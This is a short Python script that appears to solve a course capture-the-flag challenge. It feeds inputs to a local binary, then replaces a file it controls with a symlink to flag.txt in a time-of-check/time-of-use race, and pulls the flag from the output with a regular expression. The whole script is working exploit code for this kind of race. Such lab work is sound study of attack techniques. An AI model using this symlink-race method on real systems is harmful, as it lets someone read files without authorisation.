#!/usr/bin/env python3
from pwn import *
import re

# Setup
context.log_level = 'error'
open('damnimgood', 'w').close()

# Run process
io = process("./main.elf")

# Send input
io.sendline(b'50')
io.sendline(b'3000000')
io.sendline(b'damnimgood')

# Waste some precious time here, for completely NO REASON AT ALL ;)))))
for a in range(100000):
    b = a + a

# Symlink stuff
os.remove('damnimgood')
os.symlink('flag.txt', 'damnimgood')

# Do the flag reading thingy with REEEEEEEEEEE (Regular Expression stolen from professor MartinSchwarzl, he also likes to help a lot and everybody likes when he holds his lectures, all credits go to him)
r = io.recvall().decode('ascii')
flag_regex = re.compile('(InfoSec{.+[^}]})')
flag = flag_regex.findall(r)
flag = flag[0]
print(flag)

# Clean-up
os.remove('damnimgood')